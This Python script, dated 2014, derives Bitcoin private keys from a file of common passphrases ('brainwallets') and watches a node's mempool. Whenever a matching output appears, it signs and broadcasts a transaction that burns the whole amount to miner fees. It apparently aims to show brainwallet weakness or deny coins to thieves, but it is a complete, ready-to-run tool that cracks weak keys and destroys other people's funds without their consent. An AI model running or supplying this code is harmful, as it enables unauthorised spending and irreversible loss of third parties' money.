#!/usr/bin/python3
# Copyright (C) 2014 Peter Todd <pete@petertodd.org>
#
# This file is subject to the license terms in the LICENSE file found in the
# top-level directory of this distribution.

import argparse
import binascii
import bitcoin
import bitcoin.rpc
import hashlib
import logging
import time

from bitcoin.core import *
from bitcoin.core.script import *
from bitcoin.core.scripteval import *
from bitcoin.wallet import *

known_privkeys_by_scriptPubKey = {}

def create_spend_to_fees_tx(outpoint, privkey):
    txin_scriptPubKey = CScript([OP_DUP, OP_HASH160, Hash160(privkey.pub), OP_EQUALVERIFY, OP_CHECKSIG])

    txin = CMutableTxIn(outpoint)
    txout = CMutableTxOut(0, CScript([OP_RETURN]))
    tx = CMutableTransaction([txin],[txout])

    sigflags = SIGHASH_NONE | SIGHASH_ANYONECANPAY
    sighash = SignatureHash(txin_scriptPubKey, tx, 0, sigflags)
    sig = privkey.sign(sighash) + bytes([sigflags])

    txin.scriptSig = CScript([sig, privkey.pub])

    VerifyScript(txin.scriptSig, txin_scriptPubKey, tx, 0, (SCRIPT_VERIFY_P2SH,))

    return tx

def scan_tx_for_spendable_outputs(tx, txid):
    for (n, txout) in enumerate(tx.vout):
        try:
            privkey = known_privkeys_by_scriptPubKey[txout.scriptPubKey]
        except KeyError:
            continue

        outpoint = COutPoint(txid, n)
        yield create_spend_to_fees_tx(outpoint, privkey)

parser = argparse.ArgumentParser(description="Spend known secret-key outputs to fees. (e.g. brainwallets)")
parser.add_argument('-v', action='store_true',
                    dest='verbose',
                    help='Verbose')
parser.add_argument('-d', action='store', type=float,
                    dest='delay',
                    default=10,
                    help='Delay between mempool scans')
parser.add_argument('-f', action='store', type=str,
                    dest='passphrase_file',
                    default='common-passphrases',
                    help='File of passphrases, one per line')
args = parser.parse_args()

logging.root.setLevel('INFO')
if args.verbose:
    logging.root.setLevel('DEBUG')

rpc = bitcoin.rpc.Proxy()

with open(args.passphrase_file,'rb') as fd:
    def add_privkey(known_privkey):
        h = Hash160(known_privkey.pub)
        scriptPubKey = CScript([OP_DUP, OP_HASH160, h, OP_EQUALVERIFY, OP_CHECKSIG])
        known_privkeys_by_scriptPubKey[scriptPubKey] = known_privkey

        logging.info('Known: %s %s' % (b2x(scriptPubKey), b2x(known_privkey.pub)))

    n = 0
    for passphrase in fd.readlines():
        n += 1
        passphrase = passphrase.strip()
        secret = hashlib.sha256(passphrase).digest()
        add_privkey(CBitcoinSecret.from_secret_bytes(secret, False))
        add_privkey(CBitcoinSecret.from_secret_bytes(secret, True))

    logging.info('Added %d known passphrases' % n)

known_txids = set()

while True:
    mempool_txids = set(rpc.getrawmempool())
    new_txids = mempool_txids.difference(known_txids)
    known_txids.update(mempool_txids)

    burn_txs = []
    for new_txid in new_txids:
        try:
            new_tx = rpc.getrawtransaction(new_txid)
        except IndexError:
            continue

        burn_txs.extend(scan_tx_for_spendable_outputs(new_tx, new_txid))

    for burn_tx in burn_txs:
        try:
            txid = rpc.sendrawtransaction(burn_tx)
            logging.info('Sent burn tx %s' % b2lx(txid))
        except bitcoin.rpc.JSONRPCException as err:
            logging.info('Got error %s while sending %s' % (err, b2x(burn_tx.serialize())))

    logging.info('Sleeping %f seconds' % args.delay)
    time.sleep(args.delay)
